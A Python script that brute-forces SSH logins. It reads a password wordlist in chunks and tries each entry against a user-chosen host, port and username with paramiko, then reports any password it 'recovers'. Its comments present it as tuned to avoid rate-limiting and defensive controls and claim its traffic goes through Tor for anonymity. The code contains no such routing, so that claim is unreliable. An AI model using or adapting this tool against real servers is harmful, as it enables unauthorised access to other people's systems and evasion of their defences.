#!/usr/bin/env python3

import sys, os
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException

# Many SSH servers implement rate-limiting and other security mechanisms
# that restrict concurrent authentication attempts. For this reason,
# a single-connection strategy is used to maximize compatibility and
# reduce the likelihood of triggering defensive controls.

# Outbound connections are routed through the Tor network, providing
# an additional layer of anonymity and reducing the effectiveness of
# IP-based blocking and rate-limiting mechanisms

def get_encoder():
    print("\n[INFO] This option is only valid for SSH services exposed on the Internet (not for local testing)")
    print("[INFO] To ensure compatibility with special characters, select an encoding method:")
    print("1) latin-1\n2) utf-8")

    option = input("Select option [1/2]: ").strip()
    encoder_text = "latin-1" if option == "1" else "utf-8"

    return encoder_text

def ssh(passwords, hostname, username, port):

    for pwd in passwords:
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        try:
            client.connect(hostname, port=port, username=username, password=pwd, timeout=5)
            print("\n" + "=" * 50)
            print("=" * 50)
            print("[ PASSWORD FOUND ]".center(50))
            print("=" * 50)
            print(f">>> Recovered Password: {pwd}".center(50))
            print("=" * 50 + "\n")
            if pwd != pwd.strip():
                print("[WARNING:] The password contains leading or trailing whitespace")
            sys.exit(0)

        except AuthenticationException:
            print(f"[*] Trying password:- {pwd}")

        except Exception as e:
            print(f"Error with password {pwd}: {e}")

        finally:
            client.close()


def read_dic(dic_path, port, hostname, username, encoder):
    with open(dic_path, 'r', encoding=encoder, errors='ignore') as file_read:
       chunk_size = 512 * 1024
       last_line = ""

       while True:
         chunk = file_read.read(chunk_size)
         if not chunk:
            break

         buffer = last_line + chunk
         lines = buffer.splitlines()

         if chunk and not chunk.endswith('\n') and lines:
                last_line = lines.pop()
         else:
                last_line = ""

         ssh(lines, hostname, username, port)

       if last_line:
         ssh([last_line], hostname, username, port)

    print("[FINISH]>> PASSWORD NOT FOUND")

def main():
    try:
        encoder = get_encoder()

        dic_path = os.path.expanduser('~/Hash_crackV2/ssh_keys.txt')
        hostname = input("Enter SSH server IP or Domain URL: ").strip()
        port = int(input("Enter the port: ").strip())
        username = input("Enter SSH username: ").strip()

        read_dic(dic_path, port, hostname, username, encoder)

    except KeyboardInterrupt:
        print()
        sys.exit(1)

    except FileNotFoundError as f:
        print(f"[ERROR]: File not found. Please verify the path: {f}")
        sys.exit(1)

    except IsADirectoryError as d:
        print(f"[ERROR]: Expected a file but found a directory: {d}")
        sys.exit(1)

    except Exception as error:
        print(f"[ERROR]: {error}")
        sys.exit(1)


if __name__ == '__main__':
     main()

__status__="Finish"
